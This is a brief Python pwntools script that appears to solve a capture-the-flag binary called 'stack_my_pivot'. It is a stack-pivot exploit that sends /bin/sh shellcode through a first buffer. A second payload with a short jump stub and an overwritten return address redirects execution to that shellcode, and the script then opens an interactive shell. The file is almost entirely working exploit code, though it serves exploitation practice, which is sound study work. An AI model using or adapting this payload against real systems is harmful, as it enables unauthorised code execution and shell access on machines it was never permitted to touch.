#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Test locally
p = process('./stack_my_pivot')

# First buffer: 50 bytes - put full shellcode here
shellcode = asm(shellcraft.sh())
print(f"Full shellcode length: {len(shellcode)}")
first_input = shellcode.ljust(50, b'\x90')
p.send(first_input)

# Second buffer: exactly 28 bytes
jump_stub = b'\xeb\xb6'  # jmp short -0x4A

second_input = b'\x90' * 8  # dummy for pop rbp
second_input += jump_stub    # jump to first buffer (2 bytes)
second_input += b'\x90' * (23 - len(second_input))  # pad to 23 bytes
second_input += p32(0x40072e)  # 4 bytes for pivot address
second_input += b'\x90'  # one more byte to make 28 total

print(f"Second payload length: {len(second_input)}")
p.send(second_input)

# Interact
time.sleep(0.5)
p.sendline(b'id')
p.interactive()
